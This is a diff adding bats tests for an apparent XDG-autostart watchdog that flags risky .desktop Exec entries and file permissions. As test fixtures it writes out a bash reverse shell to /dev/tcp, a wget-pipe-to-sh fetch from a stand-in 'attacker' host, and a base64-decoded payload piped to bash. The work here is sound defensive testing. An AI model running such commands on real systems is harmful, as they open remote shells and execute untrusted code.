@@ -157,3 +157,70 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — xdg-autostart inventory enumerates per-session exec surface)" {
+    desktop /usr/bin/nm-applet > "${DESK}"
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (Exec under /var/tmp): writable-root expansion" {
+    desktop /usr/bin/nm-applet > "${DESK}"
+    run_wd
+    desktop /var/tmp/.x > "${DESK}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (Exec under /dev/shm): tmpfs writable-root coverage" {
+    desktop /usr/bin/nm-applet > "${DESK}"
+    run_wd
+    desktop /dev/shm/.x > "${DESK}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (reverse-shell pattern in Exec)" {
+    desktop /usr/bin/nm-applet > "${DESK}"
+    run_wd
+    desktop 'bash -i >& /dev/tcp/1.1.1.1/4444 0>&1' > "${DESK}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh in Exec)" {
+    desktop /usr/bin/nm-applet > "${DESK}"
+    run_wd
+    desktop 'sh -c "wget -qO- http://attacker/p | sh"' > "${DESK}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in Exec)" {
+    desktop /usr/bin/nm-applet > "${DESK}"
+    run_wd
+    desktop 'sh -c "echo YmFzaCAtaQ== | base64 -d | bash"' > "${DESK}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (world-writable .desktop file → alert)" {
+    desktop /usr/bin/nm-applet > "${DESK}"
+    run_wd
+    chmod 0666 "${DESK}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    desktop /usr/bin/nm-applet > "${DESK}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-xdg-autostart -- ')
+    [ "${main_count}" = "1" ]
+}
